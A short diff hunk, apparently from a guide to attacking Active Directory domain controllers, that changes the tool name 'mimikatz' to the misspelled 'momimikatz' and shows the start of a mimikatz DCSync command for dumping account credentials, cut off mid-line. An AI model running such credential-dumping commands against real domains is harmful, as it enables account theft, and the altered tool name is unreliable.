@@ -190,7 +190,7 @@ Step 1: Targeted AD Attacks on Domain Controller
   
 Technique 1: DCSync Attack  
 If you have privileges for Replicating Directory Changes , execute a DCSync attack  
-using mimikatz :
+using momimikatz :
 
 ```PowerShell
 mimikatz # lsadump::dcsync /domain:<domain> /user:<target_
